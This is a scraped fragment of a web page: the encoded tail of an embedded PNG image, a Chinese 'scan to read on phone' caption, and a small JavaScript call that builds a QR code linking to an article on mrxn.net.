qYvm5RAfzGhef0fzhaeBlHjF607g+HLRqbkVyJTl5neoD+a6R3rvp7/jztf14r0W1nsqbwUkD0HrIbw8FeoirPPlrdAnQvwwo/nC6wmpU3ijOL5chEzt0d4gPgjqrzuiovPSKrouF2HuBzPXJ1bPCvmIpVeo1boC5p4QXrkxdnWjp9b6IH3kYnkqdlx9xOsJGU/jDdbb95Ca7BiQu2DUag3RIVhaBYT31wizDuFVUwHhuzqY8xAOZ+w95HWdMeBcC2g/EPj8ikVh7FFrdRFmv7pYNT2uJ8TTeRM8vYc4sb4/dbg/9V4H3d8d4RCf14n6+E/9hY/c5amAXEt/aavoefkO7QHr/rs6iB+4/oHq481+jl9Zu+m6X8gUu08uwuyz3ryoLnZdDut+EN36QmtqPQacvZWH6DBj5caA5NUgHNboPsRe13XzhcdAilzx+hM4PmVBpn1verVdmH0QXrmKR/XlqdAnwtynPGNA8vpFiA43NDfW1xriMS9WbgyID4Ldt+PqkDqY0bzXguTlhdcTUqfwRnF8ynJPcJ6aucI+ZTms63oe4oMZq/cYkLz1IkSHoPqIY59xrQdSa05dLu50SH3Pw1q3HyQPQetHvJ4QT+tN8BiIU+r7gnmaEA5B/bv6nte3w+6Xi9bJn8FeI4f1azDfe6uLkHoIdr3Xy/XJIfXA9feQjzf7OX3Kcn+QqXXep2tehNTBfez+Rxzmfn0fVQ/x1LoCwmGNvQfEV7UVcJ+Xp8I+EL9cLM8YEB8Ex9zxK2sUr/XrTuD4lOU0O7o1dThPVU+hvo6Vq1Cv9b2A+TrWiTDn7/WypnsgPSCoD57jvZ8cUg9B+5rvXL3wekLqFN4ojvcQ9wSZKgSdJsy8++XfRUj/XT0kD0F9EA4off6bBZy5r+UwtgXwWdt9cki+lR1UX0dInboF8hGvJ8TTeRM83kNgnqJT6/uE+HY6JA8z9n6QvLrY+3Z+z9dzchG+dk2Iv+/hEYfUQdDrWwfR4YzXE+IpvQmeBgLz1NynUxbVv4qQ/rs+Xe8c5nrzhY/2Up4KSA8IljYGzLp99chFiF/efTDn9a3wNJCV6dL+3gmcPmV56T5ldci0zYvmO/a8HNJHP4RDUJ/5ziE+OKM1kNyO7/TbteKA9IFg1POfkDwEz44o9l/h9YTkjN7mz+NTVp/Wbof6zMN8N5gXYc5bt0PrzEPqIaiub4V6RJhr1XcI8UNQX7+WutjzcvOQfjCj+cLrCalTeKM43kNgnhrc5/017O6Grvc6efdBrt91/SLEByidsPfo/FTwn6BP/E/+/Ns83P6HBOoi8OmR79C+ED9w/XvIx5v9HL+ynNYj7PvXD7cpw+3ugVnv9Z1D/PY133nXK6/WEdKz61UzBqx9u7quy+0p79jz8sJjIL3o4q85gdNAIHcJzLjbHsRX0x1D/6jVuutysTwVchFync4hOtxQT/VZBcSrr6M1EB8E9UE4BHc6zHn7dr+88DSQEq943Qn88YHAfFdAOKzRlw7J73i/u/StsHshvSFoDYRD0DoI1yfCrOs339G8CKmH4Er/4wPpm7r4107gxwNxyl52x9VF/c8izHeVfVZoT5hr1K2RixC/XNTf0XxHfZB+ENRnXj7ijwcyNrvWPz+B00CcXsevXgpyV0Cw19sfkn+W9z4rDnNPPbtr9Lw+0TykLwTV9YmQvLz7IHkImi88DaTEK153AsdAINOC+/jsVvvdAeu+9oPke515EeKDPep9hJAe3QezDuHuTdzVmYfU6YNw86L5wmMgRa54/QlcA3n9DKYd/AMAAP//+feWOgAAAAZJREFUAwDXtSLOFRp/IgAAAABJRU5ErkJggg==)

手机扫码阅读


var qrcode = new QRCode(document.getElementById("posts-qrcode"), {
text: encodeURI("https://mrxn.net/jswz/skzy-formservice-updater-uploadStudioFile.html"),
width: 100,
height: 100,
colorDark: "#000000",
colorLight: "#ffffff",
correctLevel: QRCode.CorrectLevel.H
});
 